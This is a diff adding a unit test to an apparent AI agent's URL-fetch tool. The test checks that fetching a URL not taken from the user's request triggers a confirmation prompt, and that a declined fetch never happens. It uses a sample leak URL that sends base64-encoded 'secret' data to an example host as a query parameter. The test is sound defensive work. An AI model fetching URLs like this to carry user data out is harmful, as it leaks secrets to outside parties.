@@ -181,5 +181,31 @@ class WorkTests(unittest.TestCase):
             with self.assertRaises(PermissionError):
                 PublicRedirects().redirect_request(None,None,302,'Found',{},'http://127.0.0.1/')
 
+    def test_made_up_addresses_are_asked_before_fetching(self):
+        class Page:
+            def __enter__(self): return self
+            def __exit__(self,*_): return False
+            def read(self,_n): return b'<p>hello</p>'
+        class Opener:
+            def __init__(self,log): self.log=log
+            def open(self,request,timeout): self.log.append(request.full_url); return Page()
+        fetched,asked=[],[]
+        self.tools.confirm=lambda title,detail: asked.append(detail) or False  # the user says no
+        self.tools.request='Summarise https://example.com/docs/install for me'
+        self.tools.found_urls={'https://example.com/found'}
+        resolve=lambda *_a,**_k: [(None,None,None,'',('93.184.215.14',0))]
+        with patch('work_core.socket.getaddrinfo',resolve), \
+             patch('work_core.urllib.request.build_opener',lambda *_: Opener(fetched)):
+            self.assertIn('hello',self.tools.call('fetch_url',{'url':'https://example.com/docs/install'}))
+            self.assertIn('hello',self.tools.call('fetch_url',{'url':'https://example.com/found'}))
+            self.assertEqual(asked,[])
+            leak='https://example.com/collect?d=c2VjcmV0'
+            self.assertIn('declined',self.tools.call('fetch_url',{'url':leak}))
+            self.assertEqual(len(asked),1)
+            self.assertIn(leak,asked[0])
+            self.assertNotIn(leak,fetched)
+            self.tools.settings['ask_fetch']=False  # the setting turns the question off
+            self.assertIn('hello',self.tools.call('fetch_url',{'url':leak}))
+
 if __name__=='__main__':
     unittest.main()
